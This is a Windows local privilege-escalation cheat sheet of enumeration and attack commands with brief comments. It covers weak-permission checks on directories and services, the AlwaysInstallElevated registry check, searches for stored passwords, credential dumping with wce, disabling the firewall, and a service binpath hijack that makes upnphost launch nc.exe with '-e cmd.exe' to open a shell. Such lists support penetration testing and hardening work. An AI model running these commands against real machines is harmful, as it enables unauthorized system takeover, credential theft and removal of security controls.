set
echo %cd%
echo %COMSPEC%
arp -A
tasklist /SVC
fsutil fsinfo drives
wmic bios list full
gpresult /z
whoami /all
net start
DRIVERQUERY
systeminfo
hostname
ipconfig /all
route print
# This is on Windows 7 as low privilege user1.
echo %username%
# We have a win here since any non-default directory in "C:\" will give write access to authenticated users.
echo %path%
# We can check our access permissions with accesschk or cacls.
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"
# Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to "AUTO_START" so it will launch on boot!
sc qc IKEEXT
net users
type %WINDIR%\System32\drivers\etc\hosts
# Disk Information
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
# Patch IDs
wmic qfe get hotfixid
# Process Informatio
wmic process get caption,executablepath,commandline
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
wmic service [list full]
wmic share [list full]
wmic startup [list full]
wmic useraccount [list full]
netsh diag show all
netstat -ano
netsh firewall show config
netsh firewall show state
netsh firewall set opmode disable
netsh wlan show interfaces
netsh wlan show profiles
netsh wlan show drivers
netsh wlan show networks
wevtutil el
schtasks /query /fo LIST /v
sc query
wce -w
# This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
cd C:\Windows\system32
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# We can use sc to query, configure and manage windows services.
sc qc Spooler
# We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list all services.
accesschk.exe -ucqv Spooler
# This is on Windows 8.
accesschk.exe -uwcqv "Authenticated Users" *
# On a default Windows XP SP0 we can see there is a pretty big security fail.
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv SSDPSRV
accesschk.exe -ucqv upnphost
sc qc upnphost
REM sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
REM sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
cd c:\
dir wlbsctrl.dll /s

